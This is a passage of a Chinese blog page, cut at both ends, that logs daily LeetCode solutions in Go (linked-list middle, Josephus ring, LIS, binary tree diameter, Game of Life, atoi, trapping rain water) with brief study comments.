&amp;ListNode&#123;&#125;</span><br><span class="line">		temp.Next = <span class="literal">nil</span></span><br><span class="line">		temp.Val = input[i]</span><br><span class="line">		head.Next = <span class="built_in">new</span>(ListNode)</span><br><span class="line">		head.Next = temp</span><br><span class="line">		head = head.Next</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">middleNode</span><span class="params">(head *ListNode)</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">	fast, slow := head, head</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> fast.Next != <span class="literal">nil</span> &amp;&amp; fast.Next.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">			slow = slow.Next</span><br><span class="line">			fast = fast.Next.Next</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> fast.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> slow.Next</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> slow</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	input := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">	create(input)</span><br><span class="line">	<span class="comment">// // check</span></span><br><span class="line">	<span class="comment">// for pre != nil &#123;</span></span><br><span class="line">	<span class="comment">// 	fmt.Println(pre.Val)</span></span><br><span class="line">	<span class="comment">// 	pre = pre.Next</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	ans := middleNode(pre.Next)</span><br><span class="line">	fmt.Println(ans.Val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-30"><a href="#2020-3-30" class="headerlink" title="2020/3/30"></a>2020/3/30</h3><h4 id="leetcode-62-圆圈中最后剩下的数字-Go"><a href="#leetcode-62-圆圈中最后剩下的数字-Go" class="headerlink" title="leetcode 62. 圆圈中最后剩下的数字_Go"></a>leetcode 62. 圆圈中最后剩下的数字_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 约瑟夫环</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(n <span class="keyword">int</span>, m <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	x := f(n<span class="number">-1</span>, m)</span><br><span class="line">	<span class="keyword">return</span> (m + x) % n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lastRemaining</span><span class="params">(n <span class="keyword">int</span>, m <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> f(n, m)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ans := lastRemaining(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-300-最长上升子序列-Go"><a href="#leetcode-300-最长上升子序列-Go" class="headerlink" title="leetcode 300. 最长上升子序列_Go"></a>leetcode 300. 最长上升子序列_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// dp LIS</span></span><br><span class="line"><span class="keyword">const</span> m = math.MaxInt16</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dp = [m]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Max 返回较大值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Max</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> x &lt; y &#123;</span><br><span class="line">		<span class="keyword">return</span> y</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lengthOfLIS</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">		dp[i] = <span class="number">1</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; i; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> nums[i] &gt; nums[j] &amp;&amp; dp[j]+<span class="number">1</span> &gt; dp[i] &#123;</span><br><span class="line">				dp[i] = dp[j] + <span class="number">1</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = Max(ans, dp[i])</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := []<span class="keyword">int</span>&#123;<span class="number">10</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">101</span>, <span class="number">18</span>&#125;</span><br><span class="line">	ans := lengthOfLIS(a)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-1160-拼写单词-Go"><a href="#leetcode-1160-拼写单词-Go" class="headerlink" title="leetcode 1160. 拼写单词_Go"></a>leetcode 1160. 拼写单词_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">countCharacters</span><span class="params">(words []<span class="keyword">string</span>, chars <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="comment">// hashTable</span></span><br><span class="line">	<span class="keyword">var</span> hashTable = [<span class="number">26</span>]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	count := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(chars); i++ &#123;</span><br><span class="line">		hashTable[chars[i]-<span class="string">&#x27;a&#x27;</span>]++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(words); i++ &#123;</span><br><span class="line">		tempTable := hashTable</span><br><span class="line">		temp := words[i]</span><br><span class="line">		<span class="comment">//fmt.Println(temp)</span></span><br><span class="line">		flag := <span class="literal">true</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="built_in">len</span>(temp); j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> tempTable[temp[j]-<span class="string">&#x27;a&#x27;</span>] &gt; <span class="number">0</span> &#123;</span><br><span class="line">				tempTable[temp[j]-<span class="string">&#x27;a&#x27;</span>]--</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				flag = <span class="literal">false</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> flag == <span class="literal">true</span> &#123;</span><br><span class="line">			count += <span class="built_in">len</span>(temp)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> count</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	words := []<span class="keyword">string</span>&#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="string">&quot;leetcode&quot;</span>&#125;</span><br><span class="line">	chars := <span class="string">&quot;welldonehoneyr&quot;</span></span><br><span class="line">	ans := countCharacters(words, chars)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-543-二叉树的直径-Go"><a href="#leetcode-543-二叉树的直径-Go" class="headerlink" title="leetcode 543. 二叉树的直径_Go"></a>leetcode 543. 二叉树的直径_Go</h4><p>今天的前几题其实一上来都有思路，但这题让我有点迷茫，不清楚该怎么操作，让我知道昨晚这题可以休息了……</p>
<p>后来觉得其实就是要求左子树的深度+右子树的深度，这么想就简单很多了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TreeNode Definition for a binary tree node.</span></span><br><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val   <span class="keyword">int</span></span><br><span class="line">	Left  *TreeNode</span><br><span class="line">	Right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求深度</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">depth</span><span class="params">(root *TreeNode, m *<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	l := depth(root.Left, m)</span><br><span class="line">	r := depth(root.Right, m)</span><br><span class="line">	*m = max(l+r, *m)</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">int</span>(max(l, r)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">diameterOfBinaryTree</span><span class="params">(root *TreeNode)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	m := <span class="number">0</span></span><br><span class="line">	depth(root, &amp;m)</span><br><span class="line">	<span class="keyword">return</span> m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	temp := <span class="built_in">new</span>(TreeNode)</span><br><span class="line">	temp.Val = <span class="number">1</span></span><br><span class="line">	temp.Left = <span class="built_in">new</span>(TreeNode)</span><br><span class="line">	temp.Right = <span class="built_in">new</span>(TreeNode)</span><br><span class="line">	temp.Left.Val = <span class="number">2</span></span><br><span class="line">	temp.Right.Val = <span class="number">3</span></span><br><span class="line">	temp.Left.Left = <span class="built_in">new</span>(TreeNode)</span><br><span class="line">	temp.Left.Right = <span class="built_in">new</span>(TreeNode)</span><br><span class="line">	temp.Left.Left.Val = <span class="number">4</span></span><br><span class="line">	temp.Left.Right.Val = <span class="number">5</span></span><br><span class="line">	ans := diameterOfBinaryTree(temp)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-1"><a href="#2020-4-1" class="headerlink" title="2020/4/1"></a>2020/4/1</h3><h4 id="leetcode-914-卡牌分组-Go"><a href="#leetcode-914-卡牌分组-Go" class="headerlink" title="leetcode 914. 卡牌分组_Go"></a>leetcode 914. 卡牌分组_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gcd</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasGroupsSizeX</span><span class="params">(deck []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(deck); i++ &#123;</span><br><span class="line">		m[deck[i]]++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> m &#123;</span><br><span class="line">		<span class="keyword">for</span> _, k := <span class="keyword">range</span> m &#123;</span><br><span class="line">			<span class="keyword">if</span> gcd(value, k) &lt; <span class="number">2</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 感觉就是一个Hash，再加上gcd</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	deck := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>&#125;</span><br><span class="line">	fmt.Println(hasGroupsSizeX(deck))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-1111-有效括号的嵌套深度-Go"><a href="#leetcode-1111-有效括号的嵌套深度-Go" class="headerlink" title="leetcode 1111. 有效括号的嵌套深度_Go"></a>leetcode 1111. 有效括号的嵌套深度_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxDepthAfterSplit</span><span class="params">(seq <span class="keyword">string</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">	stack := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(seq))</span><br><span class="line">	<span class="keyword">var</span> deep = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> seq &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">string</span>(v) == <span class="string">&quot;(&quot;</span> &#123;</span><br><span class="line">			deep++</span><br><span class="line">			stack = <span class="built_in">append</span>(stack, deep%<span class="number">2</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">string</span>(v) == <span class="string">&quot;)&quot;</span> &#123;</span><br><span class="line">			stack = <span class="built_in">append</span>(stack, deep%<span class="number">2</span>)</span><br><span class="line">			deep--</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> stack</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 说实话，这题目我都看了半天</span></span><br><span class="line"><span class="comment">// depth(&quot;(&quot; + A + &quot;)&quot;) = 1 + depth(A) 关键是这句话理解就好了</span></span><br><span class="line"><span class="comment">// 分析到最后就是把左括号竟可能的分成两个序列即可</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	seq := <span class="string">&quot;(()())&quot;</span></span><br><span class="line">	ans := maxDepthAfterSplit(seq)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-2"><a href="#2020-4-2" class="headerlink" title="2020/4/2"></a>2020/4/2</h3><h4 id="leetcode-289-生命游戏-Go"><a href="#leetcode-289-生命游戏-Go" class="headerlink" title="leetcode 289. 生命游戏_Go"></a>leetcode 289. 生命游戏_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">abs</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> -a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gameOfLife</span><span class="params">(board [][]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	way := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	row := <span class="built_in">len</span>(board)</span><br><span class="line">	col := <span class="built_in">len</span>(board[<span class="number">0</span>])</span><br><span class="line">	<span class="comment">// select every node</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			aliveNum := <span class="number">0</span></span><br><span class="line">			<span class="comment">// select each direction</span></span><br><span class="line">			<span class="comment">// 和迷宫走法一样</span></span><br><span class="line">			<span class="keyword">for</span> x := <span class="number">0</span>; x &lt; <span class="number">3</span>; x++ &#123;</span><br><span class="line">				<span class="keyword">for</span> y := <span class="number">0</span>; y &lt; <span class="number">3</span>; y++ &#123;</span><br><span class="line">					<span class="keyword">if</span> way[x] != <span class="number">0</span> || way[y] != <span class="number">0</span> &#123;</span><br><span class="line">						r := way[x] + i</span><br><span class="line">						c := way[y] + j</span><br><span class="line">						<span class="comment">// check border</span></span><br><span class="line">						<span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; r &lt; row) &amp;&amp; (c &gt;= <span class="number">0</span> &amp;&amp; c &lt; col) &#123;</span><br><span class="line">							<span class="keyword">if</span> abs(board[r][c]) == <span class="number">1</span> &#123;</span><br><span class="line">								aliveNum++</span><br><span class="line">								fmt.Println(aliveNum, i, j)</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// check status</span></span><br><span class="line">			<span class="comment">// alive -&gt;dead</span></span><br><span class="line">			<span class="keyword">if</span> (board[i][j] == <span class="number">1</span>) &amp;&amp; (aliveNum &lt; <span class="number">2</span> || aliveNum &gt; <span class="number">3</span>) &#123;</span><br><span class="line">				board[i][j] = <span class="number">-1</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// dead -&gt;alive</span></span><br><span class="line">			<span class="keyword">if</span> (board[i][j] == <span class="number">0</span>) &amp;&amp; (aliveNum == <span class="number">3</span>) &#123;</span><br><span class="line">				board[i][j] = <span class="number">2</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> board[i][j] &gt; <span class="number">0</span> &#123;</span><br><span class="line">				board[i][j] = <span class="number">1</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				board[i][j] = <span class="number">0</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生命游戏，第一眼觉得是个图题，后来才知道主要是为了练符合状态</span></span><br><span class="line"><span class="comment">// 需要变化的是结点本身的状态，改变依据是周围结点的状态</span></span><br><span class="line"><span class="comment">// 硬做的话提前备份一个二维数组就好，尝试一下原地算法</span></span><br><span class="line"><span class="comment">// 原地算法不依赖额外的资源或者依赖少数的额外资源，仅依靠输出来覆盖输入的一种算法操作。</span></span><br><span class="line"><span class="comment">// 需要对改变后的数组状态做一些新的标记，来避免与0/1状态混淆</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">alive-&gt;dead :-1</span></span><br><span class="line"><span class="comment">alive-&gt;alive :1</span></span><br><span class="line"><span class="comment">dead-&gt;alive :2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> board = <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">	temp := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	temp = []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	temp = []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	temp = []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	board = <span class="built_in">append</span>(board, temp)</span><br><span class="line">	fmt.Println(board)</span><br><span class="line">	gameOfLife(board)</span><br><span class="line">	fmt.Println(board)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-3"><a href="#2020-4-3" class="headerlink" title="2020/4/3"></a>2020/4/3</h3><h4 id="leetcode-8-字符串转换整数-Go"><a href="#leetcode-8-字符串转换整数-Go" class="headerlink" title="leetcode 8. 字符串转换整数_Go"></a>leetcode 8. 字符串转换整数_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;unicode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动机什么的是学不会的，但各种情况的逻辑判断需要好好锻炼</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAtoi</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	flag := <span class="number">1</span></span><br><span class="line">	<span class="comment">// 按找空白符分割字符串成一个切片</span></span><br><span class="line">	strSlice := strings.FieldsFunc(str, unicode.IsSpace)</span><br><span class="line">	<span class="comment">//fmt.Println(strSlice, reflect.TypeOf(strSlice))</span></span><br><span class="line">	<span class="comment">// 分割后只需要判断切片内第一个元素即可</span></span><br><span class="line">	<span class="keyword">var</span> temp <span class="keyword">string</span></span><br><span class="line">	<span class="comment">// 防止输入&quot;&quot;</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(strSlice) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !unicode.IsDigit(<span class="keyword">rune</span>(strSlice[<span class="number">0</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">		<span class="keyword">if</span> strSlice[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">&#x27;+&#x27;</span> &#123;</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			strSlice[<span class="number">0</span>] = strSlice[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">			<span class="comment">//fmt.Println(strSlice[0])</span></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> strSlice[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span> &#123;</span><br><span class="line">			flag = <span class="number">-1</span></span><br><span class="line">			strSlice[<span class="number">0</span>] = strSlice[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	first := strSlice[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(first); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> !unicode.IsDigit(<span class="keyword">rune</span>(first[i])) &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			temp += <span class="keyword">string</span>(first[i])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// strToNum</span></span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(temp); i++ &#123;</span><br><span class="line">		ans = <span class="keyword">int</span>(temp[i]-<span class="string">&#x27;0&#x27;</span>) + ans*<span class="number">10</span></span><br><span class="line">		<span class="keyword">if</span> ans*flag &gt; math.MaxInt32 &#123;</span><br><span class="line">			<span class="keyword">return</span> math.MaxInt32</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ans*flag &lt; math.MinInt32 &#123;</span><br><span class="line">			<span class="keyword">return</span> math.MinInt32</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag * ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//str := &quot;-996 9k3 and 987&quot;</span></span><br><span class="line">	<span class="comment">//str2 := &quot;words and 987&quot;</span></span><br><span class="line">	str3 := <span class="string">&quot;-91283472332&quot;</span></span><br><span class="line">	fmt.Println(myAtoi(str3))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-4"><a href="#2020-4-4" class="headerlink" title="2020/4/4"></a>2020/4/4</h3><h4 id="leetcode-42-接雨水-Go"><a href="#leetcode-42-接雨水-Go" class="headerlink" title="leetcode 42. 接雨水_Go"></a>leetcode 42. 接雨水_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴力思维：两边最大高度的较小值减去当前高度的值</span></span><br><span class="line"><span class="comment">// 但暴力不可取，还是不暴力了……</span></span><br><span class="line"><span class="comment">// 题解里那个栈的应用是真的没想到，tcl</span></span><br><span class="line"><span class="comment">// 用two pointers来解决</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">trap</span><span class="params">(height []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	left := <span class="number">0</span></span><br><span class="line">	right := <span class="built_in">len</span>(height) - <span class="number">1</span></span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	leftMax, rightMax := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		<span class="keyword">if</span> height[left] &lt; height[right] &#123;</span><br><span class="line">			<span class="keyword">if</span> height[left] &gt;= leftMax &#123;</span><br><span class="line">				leftMax = height[left]</span><br><span class="line">			&#125; <span 